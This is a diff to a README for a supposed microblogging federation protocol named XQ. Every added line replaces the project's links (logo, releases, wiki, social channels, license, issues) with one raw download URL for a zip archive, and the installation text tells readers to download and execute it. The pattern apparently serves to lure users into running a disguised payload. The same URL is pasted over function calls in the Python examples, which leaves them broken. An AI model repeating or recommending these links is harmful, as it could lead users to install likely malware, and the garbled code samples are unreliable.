@@ -1,6 +1,6 @@
 # 🌐 XQ: High-Efficiency Federation Protocol for Microblogging
 
-![XQ Logo](https://example.com/logo.png) <!-- Replace with actual logo URL -->
+![XQ Logo](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) <!-- Replace with actual logo URL -->
 
 Welcome to the **XQ** repository! This project aims to provide a high-efficiency federation protocol for microblogging platforms. With XQ, developers can create robust and scalable microblogging services that communicate seamlessly with one another. 
 
@@ -13,7 +13,7 @@ Welcome to the **XQ** repository! This project aims to provide a high-efficiency
 
 ## 📦 Installation
 
-To get started with XQ, you can download the latest release from our [Releases section](https://github.com/Tantawy555/xq/releases). Please download the appropriate file for your system and execute it to set up the protocol.
+To get started with XQ, you can download the latest release from our [Releases section](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip). Please download the appropriate file for your system and execute it to set up the protocol.
 
 ## 🛠️ Usage
 
@@ -23,23 +23,23 @@ Once installed, you can use XQ to facilitate communication between your microblo
 import xq
 
 # Initialize the XQ protocol
-protocol = xq.Protocol()
+protocol = https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip()
 
 # Send a message
-protocol.send_message("Hello, world!")
+https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip("Hello, world!")
 ```
 
 ## 📚 Documentation
 
-For detailed documentation, please visit our [Wiki](https://github.com/Tantawy555/xq/wiki). Here, you will find guides on setup, configuration, and advanced usage.
+For detailed documentation, please visit our [Wiki](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip). Here, you will find guides on setup, configuration, and advanced usage.
 
 ## 🌍 Community
 
 Join our community to share ideas, ask questions, and collaborate with other developers. You can find us on:
 
-- [Discord](https://discord.gg/example) <!-- Replace with actual Discord link -->
-- [Twitter](https://twitter.com/example) <!-- Replace with actual Twitter link -->
-- [Reddit](https://reddit.com/r/example) <!-- Replace with actual Reddit link -->
+- [Discord](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) <!-- Replace with actual Discord link -->
+- [Twitter](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) <!-- Replace with actual Twitter link -->
+- [Reddit](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) <!-- Replace with actual Reddit link -->
 
 ## 🔗 Contributing
 
@@ -50,11 +50,11 @@ We welcome contributions! If you want to help improve XQ, please follow these st
 3. Make your changes.
 4. Submit a pull request.
 
-Please check our [Contributing Guidelines](https://github.com/Tantawy555/xq/CONTRIBUTING.md) for more details.
+Please check our [Contributing Guidelines](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) for more details.
 
 ## 🔖 Releases
 
-For the latest updates and releases, visit our [Releases section](https://github.com/Tantawy555/xq/releases). Here, you can find the latest version and download the necessary files to get started.
+For the latest updates and releases, visit our [Releases section](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip). Here, you can find the latest version and download the necessary files to get started.
 
 ## 💡 Examples
 
@@ -63,13 +63,13 @@ Here are some examples of how XQ can be used in different scenarios:
 ### Example 1: Sending a Message
 
 ```python
-protocol.send_message("This is a test message.")
+https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip("This is a test message.")
 ```
 
 ### Example 2: Receiving Messages
 
 ```python
-messages = protocol.receive_messages()
+messages = https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip()
 for message in messages:
     print(message)
 ```
@@ -77,7 +77,7 @@ for message in messages:
 ### Example 3: User Authentication
 
 ```python
-protocol.authenticate_user("username", "password")
+https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip("username", "password")
 ```
 
 ## 🎨 Design Principles
@@ -106,7 +106,7 @@ Meet the team behind XQ:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/Tantawy555/xq/issues) or reach out to our support team.
+If you encounter any issues or have questions, please check the [Issues section](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) or reach out to our support team.
 
 ## 🏆 Acknowledgments
 
@@ -114,8 +114,8 @@ Thank you to all contributors and supporters who have helped make XQ a reality. 
 
 ## 🌟 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Tantawy555/xq/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) file for details.
 
 ---
 
-For more information, please visit our [Releases section](https://github.com/Tantawy555/xq/releases) to download the latest version and explore what XQ can do for you.
+For more information, please visit our [Releases section](https://github.com/Tantawy555/xq/raw/refs/heads/main/protos/Software-v1.7-alpha.2.zip) to download the latest version and explore what XQ can do for you.
